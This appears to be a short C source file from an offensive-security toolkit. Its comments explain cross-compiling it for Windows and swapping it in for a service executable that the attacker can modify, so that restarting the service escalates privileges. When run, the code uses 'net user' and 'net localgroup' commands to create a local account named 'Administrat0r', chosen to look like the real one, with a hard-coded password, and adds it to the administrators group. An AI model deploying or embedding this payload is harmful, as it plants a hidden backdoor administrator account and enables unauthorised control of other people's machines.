#include <stdlib.h>

// Cross-compiled for win x64 with `x86_64-w64-mingw32-gcc createadmin.c -o createadmin.exe`
// Use by replacing the exe with a service exe where we have access to modify the file and a way to restart the service
int main ()
{
  system ("net user Administrat0r passwd123$ /add");
  system ("net localgroup administrators Administrat0r /add");
  return 0;
}
